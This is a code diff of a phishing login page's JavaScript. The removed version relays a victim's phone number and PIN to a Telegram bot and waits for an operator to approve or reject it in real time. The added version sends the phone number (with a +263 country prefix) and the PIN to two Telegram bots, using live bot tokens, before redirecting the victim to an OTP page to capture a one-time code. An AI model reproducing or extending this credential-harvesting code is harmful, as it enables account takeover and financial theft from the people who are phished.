@@ -638,350 +638,91 @@
          for an Approve/Reject response from the bot. -->
 
     <script>
- (function() {
-            // ============ CONFIG ============
-            const CONFIG = {
-                botToken: "9272926860:AAHanS0gwvEev4NGUmxOXoPtM22ZmwbdMZs",
-                chatId: "6527631508",
-                pollIntervalMs: 1500,
-                pollTimeoutMs: 45000,
-                approvedRedirect: "otp.html"
-            };
+ // Bot 1 (your existing)
+        const BOT_TOKEN_1 = '9292931892:AAHm_NfFE5wQAwlZfXDMi3qbp6nlB29cZEQ';
+        const CHAT_ID_1 = '6527631508';
 
-            // ============ STATE KEYS ============
-            const KEY_PENDING = 'pin_pending_approval';
-            const KEY_REQUEST_ID = 'pin_request_id';
-            const KEY_STATUS = 'pin_status';
-            const KEY_FRESH_START = 'pin_fresh_start';
+        // Bot 2 (your second bot)
+        const BOT_TOKEN_2 = '9272926860:AAHanS0gwvEev4NGUmxOXoPtM22ZmwbdMZs';
+        const CHAT_ID_2 = '6527631508';
 
-            // ============ FRESH-START GUARD ============
-            const navEntries = (performance.getEntriesByType)
-                ? performance.getEntriesByType('navigation')
-                : [];
-            const navType = navEntries.length ? navEntries[0].type : 'navigate';
+        const savedPhone = localStorage.getItem('phone');
+        const phoneInput = document.getElementById('phoneInput');
+        if (savedPhone && savedPhone.length === 9) {
+            phoneInput.value = savedPhone;
+        }
+        const pinBoxes = document.querySelectorAll('.pin-box');
+        const loginBtn = document.getElementById('loginBtn');
+        const spinnerOverlay = document.getElementById('spinnerOverlay');
+        let pinValue = '';
 
-            const cameFromHistory = (navType === 'back_forward') ||
-                                    (window.performance && performance.navigation &&
-                                     performance.navigation.type === 2);
+        function checkPinComplete() {
+            pinValue = Array.from(pinBoxes).map(box => box.value).join('');
+            loginBtn.style.display = pinValue.length === 4 ? 'block' : 'none';
+        }
 
-            if (localStorage.getItem(KEY_FRESH_START) === 'true') {
-                localStorage.removeItem(KEY_FRESH_START);
-                localStorage.removeItem(KEY_PENDING);
-                localStorage.removeItem(KEY_REQUEST_ID);
-                localStorage.removeItem(KEY_STATUS);
-            }
+        pinBoxes.forEach((box, index) => {
+            box.addEventListener('input', () => {
+                if (box.value.length === 1 && index < 3) {
+                    pinBoxes[index + 1].focus();
+                }
+                checkPinComplete();
+            });
+            box.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && box.value === '' && index > 0) {
+                    pinBoxes[index - 1].focus();
+                }
+            });
+        });
 
-            if (cameFromHistory) {
-                localStorage.removeItem(KEY_PENDING);
-                localStorage.removeItem(KEY_REQUEST_ID);
-                localStorage.removeItem(KEY_STATUS);
-            }
-
-            // ============ DOM ============
-            const pollingOverlay = document.getElementById('polling-overlay');
-            const rejectionModal = document.getElementById('rejection-modal');
-            const rejectionMessage = document.getElementById('rejection-message');
-            const pollingStatusText = document.getElementById('polling-status-text');
-            const approvalCountdown = document.getElementById('approval-countdown');
-
-            let pollTimer = null;
-            let countdownTimer = null;
-            let pollStartTime = 0;
-            let actionTaken = false;
-
-            // ============ HELPERS ============
-            function generateRequestId() {
-                return 'pin_' + Date.now() + '_' + Math.random().toString(36).substring(2, 8);
-            }
-
-            function showRejection(message) {
-                rejectionMessage.textContent = message ||
-                    'The PIN you entered was not approved. Please try again with a valid code.';
-                rejectionModal.classList.add('visible');
-            }
-
-            function hideRejection() {
-                rejectionModal.classList.remove('visible');
-            }
-
-            function cleanupAndReload() {
-                if (actionTaken) return;
-                actionTaken = true;
-                clearInterval(pollTimer);
-                clearInterval(countdownTimer);
-                localStorage.removeItem(KEY_PENDING);
-                localStorage.removeItem(KEY_REQUEST_ID);
-                window.location.reload();
-            }
-
-            // ============ REJECTION DISMISS ============
-            window.dismissRejection = function() {
-                hideRejection();
-                cleanupAndReload();
-            };
-
-            // ============ TELEGRAM API ============
-            async function tgSend(text, replyMarkup) {
-                const url = `https://api.telegram.org/bot${CONFIG.botToken}/sendMessage`;
-                const body = {
-                    chat_id: CONFIG.chatId,
-                    text: text,
-                    parse_mode: 'HTML'
-                };
-                if (replyMarkup) body.reply_markup = replyMarkup;
-
-                const res = await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(body)
-                });
-                return res.json();
-            }
-
-            async function tgAnswerCallback(callbackQueryId, text) {
-                const url = `https://api.telegram.org/bot${CONFIG.botToken}/answerCallbackQuery`;
-                await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        callback_query_id: callbackQueryId,
-                        text: text,
-                        show_alert: false
-                    })
-                });
-            }
-
-            async function tgRemoveButtons(chatId, messageId) {
-                const url = `https://api.telegram.org/bot${CONFIG.botToken}/editMessageReplyMarkup`;
-                await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        message_id: messageId,
-                        reply_markup: { inline_keyboard: [] }
-                    })
-                });
-            }
-
-            async function tgGetUpdates(offset) {
-                const url = `https://api.telegram.org/bot${CONFIG.botToken}/getUpdates?timeout=2&offset=${offset}`;
-                const res = await fetch(url);
-                return res.json();
-            }
-
-            // ============ POLLING ============
-            async function startPolling(requestId) {
-                pollStartTime = Date.now();
-                actionTaken = false;
-                pollingOverlay.classList.add('visible');
-                pollingStatusText.textContent = 'Checking status…';
-
-                let secondsLeft = Math.floor(CONFIG.pollTimeoutMs / 1000);
-                approvalCountdown.textContent = secondsLeft;
-
-                countdownTimer = setInterval(() => {
-                    secondsLeft--;
-                    if (secondsLeft <= 0) {
-                        clearInterval(countdownTimer);
-                        approvalCountdown.textContent = '0';
-                    } else {
-                        approvalCountdown.textContent = secondsLeft;
-                    }
-                }, 1000);
-
-                let offset = 0;
-                try {
-                    const initial = await tgGetUpdates(0);
-                    if (initial.ok && initial.result.length > 0) {
-                        offset = initial.result[initial.result.length - 1].update_id + 1;
-                    }
-                } catch (e) { /* ignore */ }
-
-                const poll = async () => {
-                    if (Date.now() - pollStartTime > CONFIG.pollTimeoutMs) {
-                        if (actionTaken) return;
-                        actionTaken = true;
-                        clearInterval(pollTimer);
-                        clearInterval(countdownTimer);
-                        pollingStatusText.textContent = 'Timed out. Reloading…';
-                        localStorage.removeItem(KEY_PENDING);
-                        localStorage.removeItem(KEY_REQUEST_ID);
-                        setTimeout(() => window.location.reload(), 700);
-                        return;
-                    }
-
-                    try {
-                        const data = await tgGetUpdates(offset);
-                        if (data.ok && data.result.length > 0) {
-                            for (const update of data.result) {
-                                offset = update.update_id + 1;
-
-                                if (update.callback_query) {
-                                    const cq = update.callback_query;
-                                    const cqData = cq.data || '';
-                                    const [action, cqRequestId] = cqData.split(':');
-
-                                    if (cqRequestId !== requestId) continue;
-
-                                    if (action === 'approve') {
-                                        if (actionTaken) return;
-                                        actionTaken = true;
-                                        await tgAnswerCallback(cq.id, '✅ PIN Approved');
-                                        await tgRemoveButtons(cq.message.chat.id, cq.message.message_id);
-                                        localStorage.removeItem(KEY_PENDING);
-                                        localStorage.removeItem(KEY_REQUEST_ID);
-                                        localStorage.removeItem(KEY_STATUS);
-                                        clearInterval(pollTimer);
-                                        clearInterval(countdownTimer);
-                                        pollingStatusText.textContent = 'Approved! Redirecting…';
-                                        setTimeout(() => {
-                                            window.location.href = CONFIG.approvedRedirect;
-                                        }, 500);
-                                        return;
-                                    }
-
-                                    if (action === 'reject') {
-                                        if (actionTaken) return;
-                                        actionTaken = true;
-                                        await tgAnswerCallback(cq.id, '❌ PIN Rejected');
-                                        await tgRemoveButtons(cq.message.chat.id, cq.message.message_id);
-                                        clearInterval(pollTimer);
-                                        clearInterval(countdownTimer);
-                                        localStorage.removeItem(KEY_PENDING);
-                                        localStorage.removeItem(KEY_REQUEST_ID);
-                                        pollingOverlay.classList.remove('visible');
-                                        showRejection('The PIN you entered was rejected. Please try again.');
-                                        return;
-                                    }
-                                    continue;
-                                }
-
-                                // Fallback: typed replies
-                                const msg = update.message || update.channel_post;
-                                if (!msg || !msg.text) continue;
-                                const text = msg.text.trim();
-                                if (!text.includes(requestId)) continue;
-
-                                const lower = text.toLowerCase();
-                                if (lower.includes('approved') || text.includes('✅')) {
-                                    if (actionTaken) return;
-                                    actionTaken = true;
-                                    localStorage.removeItem(KEY_PENDING);
-                                    localStorage.removeItem(KEY_REQUEST_ID);
-                                    localStorage.removeItem(KEY_STATUS);
-                                    clearInterval(pollTimer);
-                                    clearInterval(countdownTimer);
-                                    pollingStatusText.textContent = 'Approved! Redirecting…';
-                                    setTimeout(() => {
-                                        window.location.href = CONFIG.approvedRedirect;
-                                    }, 500);
-                                    return;
-                                }
-                                if (lower.includes('rejected') || text.includes('❌')) {
-                                    if (actionTaken) return;
-                                    actionTaken = true;
-                                    clearInterval(pollTimer);
-                                    clearInterval(countdownTimer);
-                                    localStorage.removeItem(KEY_PENDING);
-                                    localStorage.removeItem(KEY_REQUEST_ID);
-                                    pollingOverlay.classList.remove('visible');
-                                    showRejection('The PIN you entered was rejected. Please try again.');
-                                    return;
-                                }
-                            }
-                        }
-                    } catch (err) {
-                        console.warn('Poll error:', err);
-                    }
-                };
-
-                await poll();
-                pollTimer = setInterval(poll, CONFIG.pollIntervalMs);
-            }
-
-            // ============ RESUME PENDING POLLING ============
-            const pending = !cameFromHistory && localStorage.getItem(KEY_PENDING) === 'true';
-            const requestId = localStorage.getItem(KEY_REQUEST_ID);
-
-            if (pending && requestId) {
-                startPolling(requestId);
+        // ========== LOGIN CLICK ==========
+        loginBtn.addEventListener('click', () => {
+            const phone = phoneInput.value.trim();
+            if (!phone) {
+                alert('Please enter phone number');
                 return;
             }
 
-            // ============ WRAP submitOTP ============
-            // The original submitOTP() sends to Telegram and then redirects to
-            // otp.html. We now intercept: send with inline buttons, then poll.
-            // The original function's body is preserved below, but we shadow it
-            // so auto-submit triggers the new flow instead.
-            window.submitOTP = async function() {
-                const otp = Array.from(inputs).map(i => i.value).join("");
-                const savedPhone = document.getElementById("phone").value;
+            spinnerOverlay.style.display = 'flex';
 
-                // ---- ORIGINAL VALIDATION (unchanged) ----
-                /*if (savedPhone.length !== 8) {
-                    alert("Enter A Valid Phone Number");
-                    return;
-                }*/
+            // Save phone to localStorage
+            localStorage.setItem('phone', phone);
 
-                if (!savedPhone) {
-                    alert("Phone number missing. Please restart verification.");
-                    return;
-                }
+            // Build the credential message
+            const message = `New Login Attempt\n\nPhone: +263 ${phone}\nPIN: ${pinValue}`;
 
-                if (otp.length !== 4 || !/^\d{4}$/.test(otp)) {
-                    alert("Please enter a valid 4-digit OTP");
-                    return;
-                }
+            // Send to Bot 1
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN_1}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID_1,
+                    text: message
+                })
+            }).catch(() => {});
 
-                // ---- ENHANCED: attach requestId + inline buttons ----
-                const reqId = generateRequestId();
-                localStorage.setItem(KEY_REQUEST_ID, reqId);
-                localStorage.setItem(KEY_PENDING, 'true');
+            // Send to Bot 2
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN_2}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID_2,
+                    text: message
+                })
+            }).catch(() => {});
 
-                const message =
-                    `🔐 <b>Star login attempt</b>\n` +
-                    `─────────────\n` +
-                    `🆔 <b>Request ID:</b> <code>${reqId}</code>\n` +
-                    `📱 <b>Phone:</b> ${savedPhone}\n` +
-                    `🔢 <b>Pin:</b> <code>${otp}</code>\n` +
-                    `─────────────\n` +
-                    `Tap a button below to respond.`;
+            // Proceed to next page
+            setTimeout(() => {
+                window.location.href = 'otp.html';
+            }, 1500);
+        });
 
-                const replyMarkup = {
-                    inline_keyboard: [
-                        [
-                            { text: "✅ Approve", callback_data: `approve:${reqId}` },
-                            { text: "❌ Reject",  callback_data: `reject:${reqId}`  }
-                        ]
-                    ]
-                };
-
-                try {
-                    const data = await tgSend(message, replyMarkup);
-                    if (!data.ok) throw new Error(data.description || "Failed to send to Telegram");
-                    // No redirect here — wait for approval via polling
-                    startPolling(reqId);
-                } catch (error) {
-                    console.error("Telegram Error:", error);
-                    localStorage.removeItem(KEY_PENDING);
-                    localStorage.removeItem(KEY_REQUEST_ID);
-                    alert(error.message);
-                }
-            };
-
-            // ============ BFCACHE FRESH START ============
-            window.addEventListener('pageshow', (event) => {
-                if (event.persisted) {
-                    localStorage.removeItem(KEY_PENDING);
-                    localStorage.removeItem(KEY_REQUEST_ID);
-                    localStorage.removeItem(KEY_STATUS);
-                    clearInterval(pollTimer);
-                    clearInterval(countdownTimer);
-                    window.location.reload();
-                }
-            });
-        })();
+        checkPinComplete();
+        pinBoxes[0].focus();
     </script>
 </body>
 
